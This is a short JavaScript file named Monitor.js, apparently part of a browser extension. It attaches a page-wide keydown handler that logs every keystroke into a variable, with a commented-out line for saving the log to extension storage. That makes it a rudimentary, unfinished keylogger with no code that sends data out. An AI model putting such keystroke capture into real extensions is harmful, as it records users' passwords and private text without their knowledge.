console.log("inside Monitor.js");

var keyLog = {};

//Tracks every keyStroke
document.onkeydown = function(event){

	keyTracker(String.fromCharCode(event.keyCode));
}


function keyTracker(keypress){

	keyLog += keypress;
	//chrome.storage.local.set(keyLog);

}
